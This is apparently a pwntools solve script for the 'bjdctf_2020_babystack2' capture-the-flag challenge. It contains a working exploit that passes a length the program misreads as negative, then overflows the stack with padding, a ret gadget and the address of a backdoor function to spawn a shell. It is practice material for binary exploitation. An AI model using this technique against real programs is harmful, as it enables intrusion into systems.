from pwn import *

context.log_level = "debug"

exe = ELF("./bjdctf_2020_babystack2")
r = exe.process()
# r = remote("node4.buuoj.cn", 25768)
ret = p64(0x400599)

r.recvuntil(b"name:\n")
r.sendline(str(0x80000001))
r.recvuntil(b"name?\n")
# I debug this program at gdb and in the second phase input, 
# the nbytes is 0x80000001 which is too long for gdb to input
# even if we only need to add a short payload. This indicates
# that we can not rely on debugger completely.
r.sendline(cyclic(0x18) + ret + p64(exe.sym["backdoor"]))
r.interactive()
